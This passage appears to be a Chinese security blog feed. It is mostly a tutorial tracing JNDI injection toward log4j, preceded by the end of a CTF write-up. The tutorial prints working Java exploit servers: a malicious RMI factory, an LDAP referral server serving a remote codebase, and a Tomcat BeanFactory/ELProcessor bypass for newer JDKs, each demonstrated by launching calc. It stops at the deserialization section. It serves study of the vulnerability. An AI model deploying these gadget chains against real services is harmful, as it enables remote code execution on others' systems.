<h1 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h1><p>使用breakpoint()函数后即可随便执行命令<br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/26.png" class="" title="alt text"></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>从JNDI注入到log4j注入</title>
    <url>/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="本文章首发于先知社区从JNDI注入到log4j漏洞"><a href="#本文章首发于先知社区从JNDI注入到log4j漏洞" class="headerlink" title="本文章首发于先知社区从JNDI注入到log4j漏洞"></a>本文章首发于先知社区<a href="https://xz.aliyun.com/t/15880?time__1311=GqjxnDgQiQi%3DdGNDQ0PBKGQAPxVQd7Fa4D">从JNDI注入到log4j漏洞</a></h1><p>今天闲的慌，不知道学些什么，于是去NSS上找一下java的题目想着刷点题，于是刷到了一题log4j的题目，一直都能听说这个log4j的核弹级漏洞的威名想着学一下，于是就有了这篇文章</p>
<h1 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h1><p>首先我们要先了解一下什么是JNDI<br>JNDI全名(Java Naming and Directory Interface即Java命名和目录接口)<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/1.png" class="" title="alt text"></p>
<h2 id="命名服务"><a href="#命名服务" class="headerlink" title="命名服务"></a>命名服务</h2><p>命名服务的主要功能是将人们的友好名称映射到对象，例如地址、标识符或计算机程序通常使用的对象。</p>
<p>例如，Internet 域名系统 （DNS） 将计算机名称映射到 IP 地址：</p>
<p>www.example.com ==&gt; 192.0.2.5<br>文件系统将文件名映射到程序可用于访问文件内容的文件引用。</p>
<p>c:\bin\autoexec.bat ==&gt; File Reference</p>
<h2 id="目录服务"><a href="#目录服务" class="headerlink" title="目录服务"></a>目录服务</h2><p>许多命名服务都使用目录服务进行扩展。目录服务将名称与对象相关联，并将此类对象与属性相关联。</p>
<p>目录服务 = 命名服务 + 包含属性的对象</p>
<p>您不仅可以按对象名称查找对象，还可以获取对象的属性或根据对象的属性搜索对象。<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/1.gif" class="" title="alt text"><br>例如，电话公司的目录服务。它将订阅者的姓名映射到他的地址和电话号码。计算机的目录服务与电话公司的目录服务非常相似，因为两者都可用于存储电话号码和地址等信息。然而，计算机的目录服务要强大得多，因为它可以在线获得，并且可以用来存储用户、程序甚至计算机本身和其他计算机可以使用的各种信息。</p>
<p>directory 对象表示计算环境中的对象。例如，目录对象可用于表示打印机、人员、计算机或网络。directory 对象包含描述它所表示的对象的属性。</p>
<h1 id="JNDI可以用多种服务对，对象进行命名，挂载。"><a href="#JNDI可以用多种服务对，对象进行命名，挂载。" class="headerlink" title="JNDI可以用多种服务对，对象进行命名，挂载。"></a>JNDI可以用多种服务对，对象进行命名，挂载。</h1><h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><p>JNDI使用RMI的方式与很像<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="comment">//Server.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">ic</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">    <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;EvilObj&quot;</span>,<span class="string">&quot;EvilObj&quot;</span>,<span class="string">&quot;http://127.0.0.1:8000&quot;</span>);</span><br><span class="line">    ic.rebind(<span class="string">&quot;rmi://localhost:1099/EvilObj&quot;</span>,ref);</span><br><span class="line"><span class="comment">/*        ReferenceWrapper wrapper = new ReferenceWrapper(ref);</span></span><br><span class="line"><span class="comment">        registry.bind(&quot;RCE&quot;,wrapper);*/</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Client.java</span></span><br><span class="line"><span class="keyword">import</span> org.omg.CORBA.IRObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        InitialContext ic= <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        ic.lookup(<span class="string">&quot;rmi://localhost:1099/EvilObj&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//EvilObjv</span></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilObj</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilObj</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var2) &#123;</span><br><span class="line">            <span class="type">IOException</span> <span class="variable">e</span> <span class="operator">=</span> var2;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//恶意类是需要实现ObjectFactory接口的，即恶意工厂</span></span><br></pre></td></tr></table></figure></p>
<p>运行上面的代码就会发现JNDI的客户端加载了服务端上的EvilObj</p>
<img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/3.png" class="" title="alt text">
<img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/4.png" class="" title="alt text">
<p>一路调试会发现其最后弹计算机也就是触发命令执行的地方并不在JNDI这个包下而是进入了NamingManager<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/10.png" class="" title="alt text"></p>
<img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/11.png" class="" title="alt text">
<img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/12.png" class="" title="alt text">
<img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/5.png" class="" title="alt text">
<p>最后在loadClass里发现forName来加载类，而forName加载的是本地的类，而本地并没有我们的恶意类。我们继续调试<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/16.png" class="" title="alt text"><br>会发现其判断clas是否为空，codebase是否为空。当我们前面forName加载成功时就不会进入反之。<br>而后继续远程加载类<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/6.png" class="" title="alt text"><br>最后发现其将加载的类进行了实例化，即会运行恶意类中构造方法中的恶意代码</p>
<img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/2.png" class="" title="alt text">
<p>使用如果一个JNDI其lookup内的url可控，那么我们就就可以让其指向我们的恶意rmi服务器从而使其造成命令执行</p>
<h2 id="Ldap"><a href="#Ldap" class="headerlink" title="Ldap"></a>Ldap</h2><p>这个漏洞在爆出来后很快就被官方打了补丁。如下<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/8.png" class="" title="alt text"><br>上面的代码定义了一个系统变量trustURLCodebase。默认为false<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/9.png" class="" title="alt text"><br>上面的代码对trustURLCodebase进行了判断，我们可以发现因为起默认为false，这导致我们无法加载远程的url的类</p>
<p>其补丁将rmi进行了检测导致我们无法利用rmi来进行命令执行，但是其没有对Ldap进行过滤，所有我们还可以使用Ldap来进行命令执行<br>使用如下代码起一个Ldap加载恶意类的服务<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Ldap</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] tmp_args )</span> &#123;</span><br><span class="line">        String[] args=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://127.0.0.1:8000/#EvilObj&quot;</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">2234</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[ <span class="number">0</span> ])));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>上面的java代码可以打包成jar包而后放在vps上运行。<br>而后Client端与之前RMi的相似<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//import org.omg.CORBA.IRObject;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        InitialContext ic= <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="comment">//ic.lookup(&quot;rmi://111.230.38.159:1099/EvilObj&quot;);</span></span><br><span class="line">        <span class="comment">//ic.lookup(&quot;rmi://192.168.20.1:1099/EvilObj&quot;);</span></span><br><span class="line">        ic.lookup(<span class="string">&quot;ldap://111.230.38.159:2234/EvilObj&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>成功弹出计算机</p>
<p>调试了一下，发现最终的运行位置与RMi相同。<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/13.png" class="" title="alt text"></p>
<h1 id="更高版本的绕过"><a href="#更高版本的绕过" class="headerlink" title="更高版本的绕过"></a>更高版本的绕过</h1><p>像Ldap只能绕过8u191之前的JDK我们这里手动调一下<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/15.png" class="" title="alt text"><br>我们可以发现其在远程加载codebase的lodaClass下也加了一个trustURLCodebase这个参数。而这个参数默认肯定是false，即其不允许我们使用远端的codebase来加载工厂</p>
<p>但是其只尝试了对远程加载进行了限制，那么我们就可以尝试使用其本地的类来尝试进行命令执行。</p>
<p>而这个类是要实现了ObjectFactory。<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/23.png" class="" title="alt text"><br>我们在调试的时候就可以发现，每次在调试时都会调用这个getObjectInstance方法。那么我们可以尝试在哪些实现了ObjectFactory接口的getObjectInstance方法里寻找是否存在可以利用的部分</p>
<h2 id="Tomcat9-62"><a href="#Tomcat9-62" class="headerlink" title="Tomcat9.62"></a>Tomcat9.62</h2><p>首先在tomcat9.62及其之前下存在一个类实现了ObjectFactory且我们可以利用其反射来进行命令执行。</p>
<p>在此之前我们要先了解一个命令执行的姿势，利用ELProcessor来进行命令执行。<br>ELProcessor内存在一个eval方法，其会对命令进行反射调用，我这里写个demo<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.el.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DEMO</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ELProcessor</span> <span class="variable">processor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ELProcessor</span>();</span><br><span class="line">        processor.eval(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/19.png" class="" title="alt text"><br>我们在eval下打个断点简单调试一下，会发现其最后利用了反射的方法进行了命令执行<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/20.png" class="" title="alt text"></p>
<p>我们把视线重新转到实现了ObjectFactory的可利用类下。</p>
<p>这个可以被利用的类就是tomcat的BeanFactory类<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/21.png" class="" title="alt text"></p>
<img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/22.png" class="" title="alt text">
<p>最终其会在BeanFactory下的一个反射类调用触发命令执行，而这些参数都是我们可以控制的，接下来我会通过调试攻击过程的方式来，讲述漏洞的触发过程</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Server.java</span></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//System.setProperty(&quot;java.rmi.server.hostname&quot;, &quot;1.94.186.199&quot;);//如果要在服务器上允许需要加上这一条代码。</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, (String)<span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, (String)<span class="literal">null</span>);<span class="comment">//创建一个ResourceRef对象，其传入的Class为javax.el.ELProcessor，工厂为org.apache.naming.factory.BeanFactory</span></span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;faster=eval&quot;</span>));<span class="comment">//添加RefAddr对象，前一个参数是键值Type。在BeanFactory类内会被取出值</span></span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;faster&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>));<span class="comment">//同上</span></span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(resourceRef);</span><br><span class="line">        registry.bind(<span class="string">&quot;Tomcat9.62&quot;</span>, referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;Registry运行中......&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Client.java</span></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        InitialContext ic= <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        ic.lookup(<span class="string">&quot;rmi://192.168.20.1:1099/Tomcat9.62&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>前面实例化工厂的部分与RMI和Ldap的大同小异。</p>
<p>会进入NamingManager下的getObjectInstance来进行实例化<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/23.png" class="" title="alt text"></p>
<img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/24.png" class="" title="alt text">如何得到工厂的类名

再通过forName来加载类
<img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/26.png" class="" title="alt text">
<p>最后实例化得到了工厂<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/27.png" class="" title="alt text"></p>
<p>得到工厂后会走到如下代码从而进入BeanFactory的getObjectInstance<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/33.png" class="" title="alt text"><br>其传入的参数ref，就是我们再Server中实例化的ResourceRef类值如下<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ResourceRef[className=javax.el.ELProcessor,factoryClassLocation=<span class="literal">null</span>,factoryClassName=org.apache.naming.factory.BeanFactory,&#123;type=scope,content=&#125;,&#123;type=auth,content=&#125;,&#123;type=singleton,content=<span class="literal">true</span>&#125;,&#123;type=forceString,content=faster=eval&#125;,&#123;type=faster,content=Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>)&#125;]</span><br></pre></td></tr></table></figure><br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/28.png" class="" title="alt text"><br>而后其通过ref.getClassName()来获取我们ResourceRef类的内部的resourceClass名，即我们在Server中传入的javax.el.ELProcessor。<br>而后通过类加载其来得到这个类。命名为beanClass<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/29.png" class="" title="alt text"><br>之后将beanClass实例化为bean。<br>再获取ref内Type为forceString的内容赋值给ra，而forceString的内容为faster=eval。</p>
<p>而后又创建了一个HashMap，变量名为forced。</p>
<p>然后进入一个循环，将ra的getContent取出传入Value，而后将value的内容<code>faster=eval</code>放入数组<code>arr$</code>内。<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/30.png" class="" title="alt text"><br>后面又将数组内的值取出赋值给param，然后截取=前的所有字符赋值为param，之后的赋值为propName<br>然后将param作为键放入到之前定义的map forced中，其值为一个反射调用，其调用的，<code>beanClass.getMethod(propName, paramTypes)</code>,其放射获取的内容就是ELProcessor下的eval方法。</p>
<img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/31.png" class="" title="alt text">
<p>之后进入一个do while循环。这个循环会获取ref中的Type键的值。直到获取到非规定内容的Type的键值对。即其将ra定义为我们的传入的那个StringRefAddr<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/33.png" class="" title="alt text"><br>最终会将propName赋值为我们定义的Type:<code>faster</code></p>
<img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/32.png" class="" title="alt text">
<p>最后其再从Map中拿出键为faster的值，也就是我们的eval方法。<br>而其value获取ra的Content，其值就是我们命令执行的代码。<code>Runtime.getRuntime().exec(&quot;calc&quot;)</code><br>最后放射调用的代码其实就是 <code>eval.invoke(bean,&#39;Runtime.getRuntime().exec(&quot;calc&quot;)&#39;)</code>bean也就是ELProcessor的实例。</p>
<p>这样就可以命令执行了<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/35.png" class="" title="alt text"><br>在tomcat的9.62之后的版本里，其将之前的method.invoke(bean,valueArray)直接进行了删除，这就到导致了我们无法在使用之前的方法进行命令执行</p>
<h2 id="原生反序列化"><a href="#原生反序列化" class="headerlink" title="原生反序列化"></a>原生反序列化</h2><p>JNDI注入通过Ldap的方法是可以触发反序列的。</p>
